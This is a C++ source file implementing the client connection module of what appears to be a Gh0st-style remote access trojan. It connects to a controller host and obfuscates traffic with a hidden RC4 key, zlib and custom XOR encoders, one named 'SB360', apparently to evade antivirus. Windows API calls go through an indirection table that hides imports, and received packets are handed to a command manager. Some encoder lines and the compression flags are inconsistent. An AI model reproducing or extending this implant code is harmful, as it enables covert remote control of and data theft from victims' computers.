// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "ClientSocket.h"
#include <process.h>
#include <MSTcpIP.h>
#include "Manager.h"
#include "until.h"
#include <winsock.h>
#include "../common/zlib/zlib.h"
#pragma comment(lib, "../common/zlib/zlib.lib")
#pragma comment(lib,"Ws2_32.lib")
unsigned char CClientSocket::m_strkey[256] = {0};
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#define ZLIB_NO  0001		//数据包无压缩模式
#define ZLIB_OK  0002		//数据包为压缩模式

CClientSocket::CClientSocket()
{
	WSADATA wsaData;
	m_gFunc.WSAStartup(MAKEWORD(2, 2), &wsaData);
	
	m_hEvent = m_gFunc.CreateEvent(NULL, TRUE, FALSE, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;
	BYTE bPacketFlag[] = {'A*s%', 'n*q^', ' '};
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
	char abAQds[] = {'E','w','i','n','h','P','r','o','t','o','c','o','l','H','o','s','t','y','\0'};
	rc4_init(m_strkey,(unsigned char*)abAQds, strlen(abAQds));  //初始化 RC4密码

}
// RC4 初始化
void CClientSocket::rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)
{
	int i =0, j = 0, k[256] = {0};
	unsigned char tmp = 0;
	for(i=0;i<256;i++)
	{
		s[i]=i;
		k[i]=key[i%Len];
	}
	for (i=0; i<256; i++)
	{
		j=(j+s[i]+k[i])%256;
		tmp = s[i];
		s[i] = s[j];     //交换s[i]和s[j]
		s[j] = tmp;
	}
}

// RC4 加密解密函数
void CClientSocket::rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)
{
	int x = 0, y = 0, t = 0;
	unsigned char tmp;
	unsigned long i;
	for(i=0;i<Len;i++)
	{
		x=(x+1)%256;
		y=(y+s[x])%256;
		tmp = s[x];
		s[x] = s[y];     //交换s[x]和s[y]
		s[y] = tmp;
		t=(s[x]+s[y])%256;
		Data[i] ^= s[t];
	} 
}


CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	m_gFunc.WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	m_gFunc.CloseHandle(m_hWorkerThread);
	m_gFunc.CloseHandle(m_hEvent);

	m_gFunc.WSACleanup();
}

bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	Disconnect();
	m_gFunc.ResetEvent(m_hEvent);
	m_bIsRunning = false;
	
	m_Socket = m_gFunc.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}
	
	hostent* pHostent = NULL;
    pHostent = m_gFunc.gethostbyname(lpszHost);
	
	if (pHostent == NULL)
	{
		return false;
	}
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= m_gFunc.htons(nPort);
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	if (m_gFunc.connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR) 
	{
		return false;
	}
	
    BOOL   bConditionalAccept=TRUE;   
	DWORD  dwBytes;
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接

	if (m_gFunc.setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (const   char*)&bConditionalAccept, sizeof(BOOL)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 60 * 3; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
		m_gFunc.WSAIoctl(m_Socket, SIO_KEEPALIVE_VALS,&klive,sizeof(tcp_keepalive),NULL,0,&dwBytes,0,NULL);
	}

	m_bIsRunning = TRUE;
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	return true;
}

char* MyDecode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		
		data[i] += 0x87,0x73,0x99,0x57,0x77,0x68;
		data[i] ^= 0x15,0x21,0x32,0x42,0x23,0x73;
	}
	return data;
}

DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{	
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{

		fd_set fdRead = fdSocket;
		int nRet = m_gFunc.select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}

		if (nRet > 0)
		{
			m_gFunc.memset(buff, 0, sizeof(buff));
			int nSize = m_gFunc.recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}	
			if (nSize > 0) 
			{
				MyDecode(buff,nSize);
				pThis->OnRead((LPBYTE)buff, nSize);
			}
		}
	}
	return -1;
}

void CClientSocket::run_event_loop()
{
	m_gFunc.WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}

void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
{
	PBYTE pData = NULL;
	PBYTE pDeCompressionData = NULL;
	try
	{
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);
		
		// Check real Data
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			// Check real Data
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			{
				throw "bad buffer";
			}
			UINT nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(UINT));
			
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
				BOOL nSomp = FALSE;
				m_CompressionBuffer.Read((PBYTE) &nSomp, sizeof(BOOL));   
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				pData = new BYTE[nCompressLength];
				pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
				{
					throw "bad Allocate";
				}
				
				m_CompressionBuffer.Read(pData, nCompressLength);
				unsigned char Sbox[256] = {0};
				memcpy( Sbox, m_strkey,sizeof(m_strkey));
				rc4_crypt(Sbox,(unsigned char *)pData,nCompressLength);//RC4解密读取
            	SB360(pData, nCompressLength); //jiemi

				if(nSomp == ZLIB_NO)  //只接收没压缩数据
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pData, nCompressLength);
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}
								
				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
		}
	}
	catch(...)
	{
		if(pData) delete [] pData;
		if(pDeCompressionData) delete [] pDeCompressionData;
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}
}



void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //
	
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    m_gFunc.setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );
	
	m_gFunc.CancelIo((HANDLE) m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	m_gFunc.closesocket(m_Socket);
	
	m_gFunc.SetEvent(m_hEvent);	
	
	m_Socket = INVALID_SOCKET;
}

void CClientSocket::SB360(LPBYTE szData, unsigned long Size)//加密封包类成员
{
	//该数组用来异或
	WORD AddTable[] = {
		3,5,8,2,9,7,4,0,3,9,2,9,1,5
	};
	WORD TableSize = sizeof(AddTable)/sizeof(WORD);
	WORD iCount = 0;
	unsigned long To = Size/3;
	for (unsigned long i=0; i<To; i++)
	{
		if(iCount == TableSize) 
			iCount = 0;
		
		szData[i] ^= AddTable[iCount];
		iCount++;
	}
}

int CClientSocket::Send( LPBYTE lpData, UINT nSize )
{
	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001  + 12;
		LPBYTE			pDest = new BYTE[destLen];
		
		if (pDest == NULL)
			return 0;
		
		int	nRet = compress(pDest, &destLen, lpData, nSize);
		
		if (nRet != Z_OK)
		{
			delete [] pDest;
			return -1;
		}
		
		//////////////////////////////////////////////////////////////////////////
		SB360(pDest,destLen); //jiami
		unsigned char Sbox[256] = {0};
		memcpy( Sbox, m_strkey,sizeof(m_strkey));
		rc4_crypt(Sbox,(unsigned char *)pDest,destLen);//RC4加密发送
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
		BOOL nComp = ZLIB_OK;  //无压缩数据
		m_WriteBuffer.Write((PBYTE) &nComp, sizeof(BOOL));         //写入数据不压缩标志  4 bytes
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);

		delete [] pDest;
		
		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
		if (lpResendWriteBuffer)
			delete [] lpResendWriteBuffer;
	}
	else // 要求重发, 只发送FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
	}
	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}

char* MyEncode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] ^= 0x15,0x21,0x32,0x42,0x23,0x73;
		data[i] -= 0x87,0x73,0x99,0x57,0x77,0x68;
	}
	return data;
}

int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	MyEncode((char *)lpData,nSize);
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = m_gFunc.send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
		{

			return -1;
		}
		nSend += nRet;
		pbuf += nSplitSize;
		m_gFunc.Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
	} 
	// 发送最后的部分
	if (size > 0)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = m_gFunc.send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
		{
			return -1;
		}
		nSend += nRet;
	}


	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::SetManagerCallBack( CManager *pManager )
{
	m_pManager = pManager;
}
